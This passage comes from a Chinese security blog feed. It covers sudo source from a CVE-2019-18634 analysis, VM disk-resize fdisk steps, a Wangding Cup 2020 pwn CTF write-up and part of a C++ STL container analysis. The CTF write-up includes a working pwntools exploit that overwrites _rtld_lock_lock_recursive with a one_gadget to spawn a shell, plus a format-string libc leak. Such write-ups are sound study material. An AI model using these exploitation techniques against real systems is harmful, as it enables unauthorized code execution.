class="keyword">int</span> flags,</span><br><span class="line">    struct sudo_conv_callback *callback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savealrm</span>, <span class="title">saveint</span>, <span class="title">savehup</span>, <span class="title">savequit</span>, <span class="title">saveterm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">savetstp</span>, <span class="title">savettin</span>, <span class="title">savettou</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *pass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *askpass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> i, input, output, save_errno, neednl = <span class="number">0</span>, need_restart;</span><br><span class="line">    debug_decl(tgetpass, SUDO_DEBUG_CONV)</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>) fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (askpass == <span class="literal">NULL</span>) &#123;</span><br><span class="line">askpass = getenv_unhooked(<span class="string">"SUDO_ASKPASS"</span>);</span><br><span class="line"><span class="keyword">if</span> (askpass == <span class="literal">NULL</span> || *askpass == <span class="string">'\0'</span>)</span><br><span class="line">    askpass = sudo_conf_askpass_path();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If no tty present and we need to disable echo, try askpass. */</span></span><br><span class="line">    <span class="keyword">if</span> (!ISSET(flags, TGP_STDIN|TGP_ECHO|TGP_ASKPASS|TGP_NOECHO_TRY) &amp;&amp;</span><br><span class="line">!tty_present()) &#123;</span><br><span class="line"><span class="keyword">if</span> (askpass == <span class="literal">NULL</span> || getenv_unhooked(<span class="string">"DISPLAY"</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    sudo_warnx(U_(<span class="string">"no tty present and no askpass program specified"</span>));</span><br><span class="line">    debug_return_str(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">SET(flags, TGP_ASKPASS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If using a helper program to get the password, run it instead. */</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(flags, TGP_ASKPASS)) &#123;</span><br><span class="line"><span class="keyword">if</span> (askpass == <span class="literal">NULL</span> || *askpass == <span class="string">'\0'</span>)</span><br><span class="line">    sudo_fatalx(U_(<span class="string">"no askpass program specified, try setting SUDO_ASKPASS"</span>));</span><br><span class="line">debug_return_str_masked(sudo_askpass(askpass, prompt));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">********************************</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个函数的值决定是否执行 <code>debug_return_str_masked(sudo_askpass(askpass, prompt));</code> 这条命令</p><p>而<code>sudo_askpass</code>这个函数能够</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fork a child and exec sudo-askpass to get the password from the user.</span><br></pre></td></tr></table></figure><p>既然是fork 一个子进程，那或许有权限的设置。</p><p>先看看 这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">sudo_askpass(<span class="keyword">const</span> <span class="keyword">char</span> *askpass, <span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>], *pass;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savechld</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pfd[<span class="number">2</span>], status;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    debug_decl(sudo_askpass, SUDO_DEBUG_CONV)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set SIGCHLD handler to default since we call waitpid() below. */</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sigemptyset(&amp;sa.sa_mask);</span><br><span class="line">    sa.sa_flags = SA_RESTART;</span><br><span class="line">    sa.sa_handler = SIG_DFL;</span><br><span class="line">    (<span class="keyword">void</span>) sigaction(SIGCHLD, &amp;sa, &amp;savechld);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pfd) == <span class="number">-1</span>)</span><br><span class="line">sudo_fatal(U_(<span class="string">"unable to create pipe"</span>));</span><br><span class="line"></span><br><span class="line">    child = sudo_debug_fork();</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">-1</span>)</span><br><span class="line">sudo_fatal(U_(<span class="string">"unable to fork"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">0</span>) &#123; <span class="comment">//子进程进来的</span></span><br><span class="line"><span class="comment">/* child, point stdout to output side of the pipe and exec askpass */</span></span><br><span class="line"><span class="keyword">if</span> (dup2(pfd[<span class="number">1</span>], STDOUT_FILENO) == <span class="number">-1</span>) &#123;</span><br><span class="line">    sudo_warn(<span class="string">"dup2"</span>);</span><br><span class="line">    _exit(<span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (setuid(ROOT_UID) == <span class="number">-1</span>) <span class="comment">//////</span></span><br><span class="line">    sudo_warn(<span class="string">"setuid(%d)"</span>, ROOT_UID);</span><br><span class="line"><span class="keyword">if</span> (setgid(user_details.gid)) &#123; <span class="comment">//////</span></span><br><span class="line">    sudo_warn(U_(<span class="string">"unable to set gid to %u"</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)user_details.gid);</span><br><span class="line">    _exit(<span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (setuid(user_details.uid)) &#123;<span class="comment">///////</span></span><br><span class="line">    sudo_warn(U_(<span class="string">"unable to set uid to %u"</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)user_details.uid);</span><br><span class="line">    _exit(<span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line">closefrom(STDERR_FILENO + <span class="number">1</span>);</span><br><span class="line">execl(askpass, askpass, prompt, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line">sudo_warn(U_(<span class="string">"unable to run %s"</span>), askpass);</span><br><span class="line">_exit(<span class="number">255</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get response from child (askpass). */</span></span><br><span class="line">    (<span class="keyword">void</span>) close(pfd[<span class="number">1</span>]);</span><br><span class="line">    pass = getln(pfd[<span class="number">0</span>], buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">    (<span class="keyword">void</span>) close(pfd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for child to exit. */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">pid_t</span> rv = waitpid(child, &amp;status, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (rv == <span class="number">-1</span> &amp;&amp; errno != EINTR)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">-1</span> &amp;&amp; !WIFSTOPPED(status))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass == <span class="literal">NULL</span>)</span><br><span class="line">errno = EINTR;<span class="comment">/* make cancel button simulate ^C */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Restore saved SIGCHLD handler. */</span></span><br><span class="line">    (<span class="keyword">void</span>) sigaction(SIGCHLD, &amp;savechld, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    debug_return_str_masked(pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setuid()  sets  the  effective user ID of the calling process</span><br><span class="line">能根据上面的设置 进程的信息</span><br></pre></td></tr></table></figure><p>然后 <code>tgetpass_flags</code> 这个标志也很重要，是getpass的参数，关系到很多代码段的执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sudo_conversation(<span class="keyword">int</span> num_msgs, <span class="keyword">const</span> struct sudo_conv_message msgs[],</span><br><span class="line">    struct sudo_conv_reply replies[], struct sudo_conv_callback *callback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *pass;</span><br><span class="line">    <span class="keyword">int</span> fd, n;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> conv_debug_instance = sudo_debug_get_active_instance();</span><br><span class="line"></span><br><span class="line">    sudo_debug_set_active_instance(sudo_debug_instance);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; num_msgs; n++) &#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sudo_conv_message</span> *<span class="title">msg</span> = &amp;<span class="title">msgs</span>[<span class="title">n</span>];</span></span><br><span class="line"><span class="keyword">int</span> flags = tgetpass_flags; <span class="comment">//$$$$$$</span></span><br><span class="line">FILE *fp = <span class="built_in">stdout</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (msg-&gt;msg_type &amp; <span class="number">0xff</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> SUDO_CONV_PROMPT_ECHO_ON:</span><br><span class="line">SET(flags, TGP_ECHO);</span><br><span class="line"><span class="keyword">goto</span> read_pass;</span><br><span class="line">    <span class="keyword">case</span> SUDO_CONV_PROMPT_MASK:</span><br><span class="line">SET(flags, TGP_MASK);</span><br><span class="line"><span class="comment">/* FALLTHROUGH */</span></span><br><span class="line">    <span class="keyword">case</span> SUDO_CONV_PROMPT_ECHO_OFF:</span><br><span class="line"><span class="keyword">if</span> (ISSET(msg-&gt;msg_type, SUDO_CONV_PROMPT_ECHO_OK))</span><br><span class="line">    SET(flags, TGP_NOECHO_TRY);</span><br><span class="line">    read_pass:</span><br><span class="line"><span class="comment">/* Read the password unless interrupted. */</span></span><br><span class="line">pass = tgetpass(msg-&gt;msg, msg-&gt;timeout, flags, callback); <span class="comment">//$$$$</span></span><br></pre></td></tr></table></figure><p>然后exp就差不多这样了。</p><p>end ~·</p><p>参考：</p><p><a href="https://www.anquanke.com/post/id/198481" target="_blank" rel="noopener">1</a></p><p><a href="https://xz.aliyun.com/t/7622" target="_blank" rel="noopener">2</a></p><p><a href="https://iamalsaher.tech/posts/2020-02-08-cve-2019-18634/" target="_blank" rel="noopener">3</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="CVE" scheme="https://leave-Devour.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机扩容</title>
    <link href="https://leave-devour.github.io/2020/07/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9/"/>
    <id>https://leave-devour.github.io/2020/07/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9/</id>
    <published>2020-07-15T01:02:21.000Z</published>
    <updated>2020-07-17T14:07:47.324Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>1、先在设置里面扩容，但在扩容前是不能有快照的，好像。。</p><p>2、启动虚拟机，然后往下面的步骤执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1、先拍个快照</span><br><span class="line">2、sudo fdisk /dev/sda 查看分区情况</span><br><span class="line">3、关闭交换分区</span><br><span class="line">sudo swapoff /dev/sda5</span><br><span class="line">4、sudo fdisk /dev/sda</span><br><span class="line">从后往上一个个删掉</span><br><span class="line">d</span><br><span class="line">index</span><br><span class="line">5、重新建立分区</span><br><span class="line">n</span><br><span class="line">p</span><br><span class="line">回车</span><br><span class="line">你要的大小，最好留点给交换分区</span><br><span class="line">这个创建的是根分区</span><br><span class="line">6、创建新的扩展分区</span><br><span class="line">n</span><br><span class="line">e</span><br><span class="line">回车</span><br><span class="line">回车</span><br><span class="line">7、在创建交换分区</span><br><span class="line">n</span><br><span class="line">回车</span><br><span class="line">回车</span><br><span class="line">回车</span><br><span class="line">t</span><br><span class="line">5</span><br><span class="line">82</span><br><span class="line">8、设置启动分区</span><br><span class="line">a</span><br><span class="line">1</span><br><span class="line">9、sudo reboot</span><br><span class="line">10、sudo resize2fs /dev/sda1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="日常" scheme="https://leave-Devour.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="Vmare" scheme="https://leave-Devour.github.io/tags/Vmare/"/>
    
  </entry>
  
  <entry>
    <title>2020年网鼎杯pwn 复现</title>
    <link href="https://leave-devour.github.io/2020/05/11/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%20%E5%A4%8D%E7%8E%B0/"/>
    <id>https://leave-devour.github.io/2020/05/11/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFpwn%20%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-05-11T12:45:16.000Z</published>
    <updated>2020-07-17T14:09:40.377Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>刚刚开始看的时候，还觉得很奇怪这题，代码也太长了吧。。。</p><p>后面经过keer和队内的师傅指点，才知道是一个 代码运行器之类的东西，就是输入c语言代码然后再去执行</p><p><img src="/images/image-20200511204911999.png" alt="image-20200511204911999"></p><p>malloc几个特别大的块，malloc的时候，如果chunk很大，就会分配到libc附近，就是说，和libc的偏移有很大概率都是固定的。</p><p>后来尝试了几个函数，发现有些函数被禁了</p><p><img src="/images/image-20200511205103493.png" alt="image-20200511205103493"></p><p>然后 声明变量的时候，只能声明，然后再赋值</p><p>不能声明数组，但是可以声明指针，函数只能执行一次</p><p><img src="/images/image-20200511205218563.png" alt="image-20200511205218563"></p><p>经过输出判断，就是这些地方出现了 notallow，做的时候，如果能改掉这个值，那就可以执行多次函数了。</p><p><img src="/images/image-20200511205307107.png" alt="image-20200511205307107"></p><p>但是这题怎么找到，程序的基地址，还有libc，还有如何判断 libc版本的判断？</p><p>首先找到libc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里可以用printf</span><br><span class="line">int main()&#123;printf(&quot;%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n&quot;);return 0 ;&#125;</span><br><span class="line">输出start_main+240的地址</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200511210842890.png" alt="image-20200511210842890"></p><p><img src="/images/image-20200511210942628.png" alt="image-20200511210942628"></p><p>就能找到一个libc内函数的地址，这时候我可以用LibcSearcher</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = 0x7fc02e08b830-240</span><br><span class="line">obj = LibcSearcher(&quot;__libc_start_main&quot;,s)</span><br><span class="line">libc =s -  obj.dump(&quot;__libc_start_main&quot;)</span><br><span class="line">log.info(hex(libc))</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200511211124250.png" alt="image-20200511211124250"></p><p>就发现两个libc，用第一个求得libc的地址</p><p>然后我们可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char *a;</span><br><span class="line">a = &apos;yezi&apos;</span><br></pre></td></tr></table></figure><p>然后同时打印出start_main的地址和a的地址，然后就可以确定 指针a保存的地址到libc的距离</p><p>因为声明的数据的地址都在malloc的内存上，而malloc的size过大。这样malloc的内存就会在ld附近</p><p><img src="/images/image-20200511205538549.png" alt="image-20200511205538549"></p><p><img src="/images/image-20200511205556755.png" alt="image-20200511205556755"></p><p>然后再，直接对指正a保存的地址进行一些操作控制libc后面的一片内存</p><p>那基地址呢</p><p><img src="/images/image-20200511205815699.png" alt="image-20200511205815699"></p><p>再查看 malloc的那块内存的时候发现了好多执行程序基地址的地址，</p><p>如果我们能控制一个指针指向这边，那我们就可以用取值，把指针里面的东西给取出来</p><p>既然libc和基地址都有了，剩下来就判断libc的时候了。</p><p>判断libc就有难了，在赛后我问了师傅，师傅说是2.23-11版本的libc，但是libcSearcher没有。但是2.23-10和11其实差别，但比较幸运的是11版本的和10版本有个小区别。但是rec 10的11都有，所以10里面有个也可以用。</p><p>但最近下的ubutun应该都是11的了。所以用本地测下就ok了</p><p>剩下的就测下就知道了，但本地复现的时候就出现了问题。同时11的libc。但是偏移老师算不对。最后想到了上面的方法。就能算对了</p><p>想要getshell，可以写malloc_hook或者exit_hook</p><p>或者琪琪师傅上次的虎符的wp里面用到的</p><p><img src="/images/image-20200511211415354.png" alt="image-20200511211415354"></p><p>这个估计也可以。</p><h3 id="2、boom2"><a href="#2、boom2" class="headerlink" title="2、boom2"></a>2、boom2</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>很明显的一道vm题</p><p>呜呜，分析不来</p><p>太多指令了，还有太多while了</p><p>但怎么说呢。这道题。其他vm里面有的输出，也没输入。那就只能修改exithook了。或许能获取到栈值。改ret（后面的还没想到。到最后，我还是大部分指令没逆出来，但是，知道一部分就能getshell了</p><p>既然明确要往某个地址写东西，那么就要有写操作</p><p>最好是可以控制的，</p><p><img src="/images/image-20200512014005019.png" alt="image-20200512014005019"></p><p>这里是一个很好的选择，毕竟second我是可以控制的</p><p>然后，我想改变second的值</p><p>我有两种方法基本对应了两种思路，</p><p>我用的是</p><p><img src="/images/image-20200512014123991.png" alt="image-20200512014123991"></p><p>明显看的最后有个取地址的操作，那就说明我能改变second的指向，指向一个存在libc内函数的地址，</p><p>然后再通过first，进行相加，而这时候 first的值就是_rtld_lock_lock_recursive</p><p>然后将first打入second中</p><p><img src="/images/image-20200512014344585.png" alt="image-20200512014344585"></p><p>然后此时的 second指向内存存的值是_rtld_lock_lock_recursive</p><p>然后这时候我可以来一手相减，也就是把一个值放到first</p><p><img src="/images/image-20200512014458884.png" alt="image-20200512014458884"></p><p>然后 second指向内存存的值减去first就给first，second ++</p><p>然后first就有onegadgets的地址了</p><p>如果这时候second指向内存存的值是_rtld_lock_lock_recursive</p><p>那就可以直接</p><p><img src="/images/image-20200512014702055.png" alt="image-20200512014702055"></p><p>但在进行sub操作的是second已经 ++ 了一次</p><p>所以second指向内存存的值不再指向_rtld_lock_lock_recursive</p><p>但是可以通过 put两次 first进入 second中就能实现</p><p>second指向内存存的值指向_rtld_lock_lock_recursive</p><p>然后再进行11的操作就能getshell</p><p>这里感觉最关键的就是连续两次put值进second。。就是开始没想到，复现了好久。。。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> x                  :orda.send(str(x))</span><br><span class="line">sa      = <span class="keyword">lambda</span> x, y                 :orda.sendafter(str(x),str(y)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> x                   :orda.sendline(str(x)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> x, y                 :orda.sendlineafter(str(x), str(y)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :orda.recv(numb)</span><br><span class="line">rc        = <span class="keyword">lambda</span>                     :orda.recvall()</span><br><span class="line">ru      = <span class="keyword">lambda</span> x, drop=<span class="literal">True</span>          :orda.recvuntil(x, drop)</span><br><span class="line">rr        = <span class="keyword">lambda</span> x                    :orda.recvrepeat(x)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :orda.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> x   :u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> x   :u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase_b64</span><span class="params">(t)</span>:</span></span><br><span class="line">    pid=proc.pidof(s)[<span class="number">0</span>]</span><br><span class="line">    pie_pwd =<span class="string">'/proc/'</span>+str(pid)+<span class="string">'/maps'</span></span><br><span class="line">    f_pie=open(pie_pwd)</span><br><span class="line">    <span class="keyword">return</span> f_pie.read()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    host = s.split(<span class="string">":"</span>)[<span class="number">0</span>]</span><br><span class="line">    port = int(s.split(<span class="string">":"</span>)[<span class="number">1</span>])</span><br><span class="line">    orda = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    orda = process(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x479968</span></span><br><span class="line">offset1 = <span class="number">0x5f0f48</span><span class="number">-0xf02a4</span></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="number">6</span>,<span class="number">-0x4da</span>,</span><br><span class="line">    <span class="number">1</span>,offset,</span><br><span class="line">    <span class="number">25</span>,</span><br><span class="line">    <span class="number">13</span>,</span><br><span class="line">    <span class="number">13</span>,</span><br><span class="line">    <span class="number">1</span>,offset1,</span><br><span class="line">    <span class="number">26</span>,</span><br><span class="line">    <span class="number">11</span></span><br><span class="line">    ])</span><br><span class="line">ru(<span class="string">"Input your code&gt; "</span>)</span><br><span class="line">raw_input()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="复现" scheme="https://leave-Devour.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>c++中容器 list和vector分析</title>
    <link href="https://leave-devour.github.io/2020/05/09/c++%E4%B8%AD%E5%AE%B9%E5%99%A8%20list%E5%92%8Cvector%E5%88%86%E6%9E%90/"/>
    <id>https://leave-devour.github.io/2020/05/09/c++%E4%B8%AD%E5%AE%B9%E5%99%A8%20list%E5%92%8Cvector%E5%88%86%E6%9E%90/</id>
    <published>2020-05-09T12:51:37.000Z</published>
    <updated>2020-07-17T14:09:25.409Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>就拿这次De1ctf中的<code>stl_container</code> 作为分析</p><p>首先先分析下list push_back和pop_back</p><hr><p>一个list一般 占3个机器长度，初始化为0</p><p><img src="/images/image-20200509205700006.png" alt="image-20200509205700006"></p><p><img src="/images/image-20200509205748792.png" alt="image-20200509205748792"></p><p>然后把本身的地址放在第一，第二个位置，应该就是首尾指针了</p><p>然后第三个位置就是size初始化为0</p><p>在add一个的时候，</p><p><img src="/images/image-20200509210008963.png" alt="image-20200509210008963"></p><p><img src="/images/image-20200509210034161.png" alt="image-20200509210034161"></p><p>会增加一个node，然后把当前的 首指针和next指针作为一二位，然后put进去的数据作为第三位，这个list，如果list的node，size不够会继续增大，但是这道题只能puts两个，所以初始化的size基本就够用了</p><p>当再put一个数据进去的时候</p><p><img src="/images/image-20200509210338391.png" alt="image-20200509210338391"></p><p>可以很明显的看到引用保存的两个指针和size都发生了变化，第一个指针指向的首node，第二个指针指向上个node，形成单链表</p><p>在pop的时候就直接改引用，然后改size，再free</p><p>而且</p><p><img src="/images/image-20200509210528966.png" alt="image-20200509210528966"></p><p>那么list就到这里</p><hr><p>接下来就是vector</p><p><img src="/images/image-20200509211036999.png" alt="image-20200509211036999"></p><p>vector的初始化，也是全零</p><p>他不像list那样维持一个size来管理整个单链表</p><p>而是通过前两个指针来管理一块内存，这块内存保存着，我们put进去的数据的指针</p><p>put 一个进来</p><p><img src="/images/image-20200509212146527.png" alt="image-20200509212146527"></p><p>可以很明显的看到第一第二个指针相差8</p><p><img src="/images/image-20200509212257783.png" alt="image-20200509212257783"></p><p><img src="/images/image-20200509212311699.png" alt="image-20200509212311699"></p><p>put 第二个</p><p><img src="/images/image-20200509212347021.png" alt="image-20200509212347021"></p><p><img src="/images/image-20200509212400596.png" 